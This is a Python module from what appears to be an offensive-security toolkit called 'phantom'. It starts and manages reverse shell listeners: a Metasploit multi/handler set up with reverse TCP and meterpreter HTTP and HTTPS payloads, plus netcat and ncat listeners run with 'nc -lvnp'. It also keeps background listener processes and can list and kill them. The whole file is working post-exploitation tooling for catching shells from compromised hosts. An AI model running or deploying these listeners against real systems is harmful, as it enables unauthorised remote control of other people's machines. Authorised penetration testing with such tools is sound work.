"""
handler.py — Reverse shell listener management.
Supports MSF multi/handler, netcat, ncat, and custom listeners.
"""

from phantom.modules.base_module import BaseModule
from phantom.core.executor import run_command
from rich.console import Console
from rich.table import Table
from phantom.utils.notifier import notifier
import subprocess
import os
import signal

console = Console()


class HandlerModule(BaseModule):
    module_name = "handler"

    def __init__(self):
        super().__init__()
        self._listeners: dict[int, subprocess.Popen] = {}

    def start_listener(self, port: str = "4444", payload: str = "linux/x64/shell_reverse_tcp", background: bool = False):
        if int(port) in self._listeners:
            notifier.warn(f"Listener already active on port {port}")
            return
        cmd = (
            f'msfconsole -q -x "'
            f'use exploit/multi/handler; '
            f'set PAYLOAD {payload}; '
            f'set LHOST 0.0.0.0; '
            f'set LPORT {port}; '
            f'set ExitOnSession false; '
            f'run -j"'
        )
        notifier.status(f"Starting MSF listener on 0.0.0.0:{port}")
        if background:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                     preexec_fn=os.setsid if hasattr(os, 'setsid') else None)
            self._listeners[int(port)] = proc
            notifier.success(f"Background MSF listener started on port {port} (PID {proc.pid})")
        else:
            notifier.warn("Listener runs in foreground. Ctrl+C to stop.")
            run_command(cmd)

    def do_listen(self, args):
        """listen --port <port> --type <tcp|https> --payload <payload> [--bg]"""
        import argparse
        parser = argparse.ArgumentParser()
        parser.add_argument("--port", default="4444")
        parser.add_argument("--type", default="tcp")
        parser.add_argument("--payload", default=None)
        parser.add_argument("--bg", action="store_true", help="Run in background")
        try:
            parsed = parser.parse_args(args.split())
        except SystemExit:
            return

        payloads = {
            "tcp":   "linux/x64/shell_reverse_tcp",
            "https": "linux/x64/meterpreter/reverse_https",
            "http":  "linux/x64/meterpreter/reverse_http",
        }
        payload = parsed.payload or payloads.get(parsed.type, "linux/x64/shell_reverse_tcp")
        self.start_listener(parsed.port, payload, background=parsed.bg)

    def do_nc(self, args):
        """nc <port> [--bg] — start a netcat listener."""
        parts = args.split()
        port = parts[0] if parts else "4444"
        bg = "--bg" in parts
        if int(port) in self._listeners:
            notifier.warn(f"Listener already active on port {port}")
            return
        cmd = f"nc -lvnp {port}"
        notifier.status(f"Starting netcat on port {port}...")
        if bg:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                     preexec_fn=os.setsid if hasattr(os, 'setsid') else None)
            self._listeners[int(port)] = proc
            notifier.success(f"Background netcat started on port {port} (PID {proc.pid})")
        else:
            notifier.warn("Netcat runs in foreground. Ctrl+C to stop.")
            run_command(cmd)

    def do_ncat(self, args):
        """ncat <port> [--ssl] [--bg] — start an ncat listener."""
        parts = args.split()
        port = parts[0] if parts else "4444"
        ssl = "--ssl" in parts
        bg = "--bg" in parts
        cmd = f"ncat -lvnp {port}" + (" --ssl" if ssl else "")
        if bg:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                     preexec_fn=os.setsid if hasattr(os, 'setsid') else None)
            self._listeners[int(port)] = proc
            notifier.success(f"Background ncat started on port {port} (PID {proc.pid})")
        else:
            notifier.warn("ncat runs in foreground. Ctrl+C to stop.")
            run_command(cmd)

    def do_list(self, _):
        """list — show active background listeners."""
        if not self._listeners:
            notifier.info("No background listeners active.")
            return
        alive = {}
        for port, proc in list(self._listeners.items()):
            if proc.poll() is None:
                alive[port] = proc
            else:
                del self._listeners[port]
        if not alive:
            notifier.info("No background listeners active.")
            return
        table = Table(title="Active Listeners")
        table.add_column("Port", style="cyan")
        table.add_column("PID", style="yellow")
        table.add_column("Status", style="green")
        for port, proc in alive.items():
            table.add_row(str(port), str(proc.pid), "RUNNING")
        console.print(table)

    def do_kill(self, args):
        """kill <port> — stop a background listener by port."""
        if not args.strip():
            notifier.error("Usage: kill <port>")
            return
        port = int(args.strip())
        proc = self._listeners.pop(port, None)
        if proc and proc.poll() is None:
            if hasattr(os, 'setsid'):
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            else:
                proc.terminate()
            notifier.success(f"Listener on port {port} stopped.")
        else:
            notifier.warn(f"No active listener on port {port}.")

    def build_commands(self) -> dict:
        return {
            "MSF HANDLER": [
                "listen --port 4444 --payload linux/x64/shell_reverse_tcp  AGGRESSIVE",
                "listen --port 4443 --type https  AGGRESSIVE",
                "listen --port 8080 --type http  AGGRESSIVE",
            ],
            "NETCAT": [
                "nc 4444",
                "ncat 4444 --ssl",
            ],
        }

    def do_run(self, _):
        port = input("  Port [4444]: ").strip() or "4444"
        bg = input("  Background? [y/N]: ").strip().lower() == "y"
        self.start_listener(port, background=bg)

    def do_preview(self, _):
        self.do_run(_)
